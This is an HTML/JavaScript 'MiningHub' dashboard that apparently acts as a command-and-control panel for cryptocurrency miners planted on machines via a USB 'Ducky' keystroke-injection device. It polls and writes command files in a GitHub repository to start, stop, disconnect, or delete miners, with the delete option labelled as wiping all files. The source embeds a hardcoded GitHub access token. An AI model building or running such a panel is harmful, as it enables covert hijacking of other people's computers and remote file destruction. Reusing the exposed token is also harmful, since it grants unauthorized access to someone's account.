<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>MiningHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui;background:#0d1117;color:#e6edf3;padding:30px}
h1{font-size:24px;margin-bottom:25px}
h1 span{color:#3fb950}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:15px;margin-bottom:30px}
.stat{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:20px}
.stat-label{font-size:12px;color:#8b949e}
.stat-value{font-size:24px;font-weight:600;color:#3fb950}
.miners{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:20px}
.miner{display:flex;align-items:center;gap:15px;padding:15px;background:#0d1117;border:1px solid #30363d;border-radius:8px;margin-top:10px}
.dot{width:12px;height:12px;border-radius:50%;background:#484f58}
.dot.on{background:#3fb950;box-shadow:0 0 10px #3fb950}
.dot.idle{background:#f0883e}
.info{flex:1}
.name{font-weight:500}
.sub{font-size:12px;color:#8b949e}
.hr{font-size:18px;font-weight:600;color:#3fb950;min-width:80px;text-align:right}
.btns{display:flex;gap:8px}
.btn{padding:6px 12px;border:1px solid #30363d;border-radius:6px;background:#21262d;color:#e6edf3;cursor:pointer;font-size:12px}
.btn:hover{background:#30363d}
.btn.stop{border-color:#f85149;color:#f85149}
.btn.start{border-color:#3fb950;color:#3fb950}
.btn.del{border-color:#f85149;color:#f85149}
.empty{text-align:center;padding:40px;color:#8b949e}
</style>
</head>
<body>
<h1>⛏️ Mining<span>Hub</span></h1>
<div class="stats">
<div class="stat"><div class="stat-label">ACTIVE</div><div class="stat-value" id="s-active">0</div></div>
<div class="stat"><div class="stat-label">HASHRATE</div><div class="stat-value" id="s-hr">0 H/s</div></div>
</div>
<div class="miners">
<b>Miners</b>
<div id="list"><div class="empty">No miners yet</div></div>
</div>
<script>
const TOKEN="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"
const REPO="max1734601-cpu/mining-dashboard";
let miners={},cmds={},sha_m="",sha_c="";

async function load(){
try{
let r=await fetch(`https://api.github.com/repos/${REPO}/contents/miners.json`,{headers:{Authorization:`token ${TOKEN}`}});
let d=await r.json();sha_m=d.sha;miners=JSON.parse(atob(d.content));
}catch(e){miners={}}
try{
let r=await fetch(`https://api.github.com/repos/${REPO}/contents/commands.json`,{headers:{Authorization:`token ${TOKEN}`}});
let d=await r.json();sha_c=d.sha;cmds=JSON.parse(atob(d.content));
}catch(e){cmds={}}
render();
}

async function sendCmd(id,cmd){
cmds[id]=cmd;
await fetch(`https://api.github.com/repos/${REPO}/contents/commands.json`,{
method:"PUT",
headers:{Authorization:`token ${TOKEN}`,"Content-Type":"application/json"},
body:JSON.stringify({message:"cmd",content:btoa(JSON.stringify(cmds)),sha:sha_c})
});
if(cmd=="delete"){
delete miners[id];
delete cmds[id];
await fetch(`https://api.github.com/repos/${REPO}/contents/miners.json`,{
method:"PUT",
headers:{Authorization:`token ${TOKEN}`,"Content-Type":"application/json"},
body:JSON.stringify({message:"del",content:btoa(JSON.stringify(miners)),sha:sha_m})
});
}
load();
}

function render(){
const list=Object.entries(miners);
if(!list.length){document.getElementById('list').innerHTML='<div class="empty">No miners yet - plug in your Ducky!</div>';document.getElementById('s-active').textContent='0';document.getElementById('s-hr').textContent='0 H/s';return}
let active=0,hr=0;
document.getElementById('list').innerHTML=list.map(([id,d])=>{
const online=(Date.now()-d.lastSeen)<120000;
const cmd=cmds[id]||"";
const stopped=cmd=="stop";
const disc=cmd=="disconnect";
const mining=online&&d.mining&&!stopped&&!disc;
if(mining){active++;hr+=d.hashrate||0}
let status=!online?"Offline":disc?"Disconnected":stopped?"Idle (stopped)":d.mining?"Mining":"Idle";
let dotClass=!online?"":disc?"":stopped?"idle":d.mining?"on":"idle";
return`<div class="miner">
<div class="dot ${dotClass}"></div>
<div class="info"><div class="name">${d.name}</div><div class="sub">${d.ip} • ${status}</div></div>
<div class="hr">${mining?(d.hashrate||0)+' H/s':'—'}</div>
<div class="btns">
${stopped?`<button class="btn start" onclick="sendCmd('${id}','start')">Start</button>`:`<button class="btn stop" onclick="sendCmd('${id}','stop')">Stop</button>`}
${disc?`<button class="btn start" onclick="sendCmd('${id}','connect')">Connect</button>`:`<button class="btn" onclick="sendCmd('${id}','disconnect')">Disconnect</button>`}
<button class="btn del" onclick="if(confirm('Delete miner and wipe all files?'))sendCmd('${id}','delete')">✕</button>
</div>
</div>`;
}).join('');
document.getElementById('s-active').textContent=active;
document.getElementById('s-hr').textContent=hr>=1000?(hr/1000).toFixed(1)+' KH/s':hr+' H/s';
}

load();setInterval(load,30000);
</script>
</body>
</html>
